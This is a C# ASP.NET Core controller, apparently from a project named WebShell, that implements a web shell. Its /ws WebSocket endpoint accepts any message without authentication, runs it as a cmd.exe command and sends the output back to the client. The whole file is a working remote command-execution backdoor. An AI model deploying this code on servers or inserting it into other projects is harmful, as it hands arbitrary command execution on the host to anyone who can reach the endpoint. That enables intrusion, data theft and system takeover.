using System.Diagnostics;
using System.Text;
using Microsoft.AspNetCore.Mvc;
using System.Net.WebSockets;
using WebShell.Helpers;

namespace WebShell.Controllers;

public class WebSocketController : ControllerBase
{
    [Route("/ws")]
    public async Task Get()
    {
        if (HttpContext.WebSockets.IsWebSocketRequest)
        {
            using var webSocket = await HttpContext.WebSockets.AcceptWebSocketAsync();
            await Echo(webSocket);
        }
        else
        {
            HttpContext.Response.StatusCode = StatusCodes.Status400BadRequest;
        }
    }


    private static async Task Echo(WebSocket webSocket)
    {
        Console.WriteLine("BEGIN ECHO");

        var buffer = new byte[1024 * 4];
        var receiveResult = await webSocket.ReceiveAsync(
            new ArraySegment<byte>(buffer), CancellationToken.None);
        Console.WriteLine("RECEIVE WS <-");


        Console.WriteLine("CLOSE STATUS : " + !receiveResult.CloseStatus.HasValue);

        while (!receiveResult.CloseStatus.HasValue)
        {
            var shell = new Process();

            shell.StartInfo = new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
            };

            shell.Start();
            shell.BeginErrorReadLine();
            shell.BeginOutputReadLine();


            var result = "";
            var output = "";
            /* Code for send */
            var command = Encoding.UTF8.GetString(buffer, 0, receiveResult.Count);

            Console.WriteLine($"SERVER COMMAND : {command}");
            
            try
            {
                shell.StandardInput.WriteLine(command);

                shell.OutputDataReceived += (sender, e) => { result += e.Data + "\n"; };
                shell.ErrorDataReceived += (sender, e) => { result += e.Data + "\n"; };

                shell.StandardInput.WriteLine("exit");
                shell.WaitForExit();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }

            Console.WriteLine($"RESULT: {result.Length}");

            output = new SplitResult().GetOutput(result);
            var mess = Encoding.UTF8.GetBytes(output);

            Console.WriteLine($"OUTPUT: {output.Length}");

            await webSocket.SendAsync(
                new ArraySegment<byte>(mess, 0, mess.Length),
                receiveResult.MessageType,
                receiveResult.EndOfMessage,
                CancellationToken.None);

            Console.WriteLine("SEND TO CLIENT ->");

            receiveResult = await webSocket.ReceiveAsync(
                new ArraySegment<byte>(buffer), CancellationToken.None);
            Console.WriteLine("RECEIVE WS <-");
        }

        Console.WriteLine("AFTER WHILE");


        await webSocket.CloseAsync(
            receiveResult.CloseStatus.Value,
            receiveResult.CloseStatusDescription,
            CancellationToken.None);
    }
}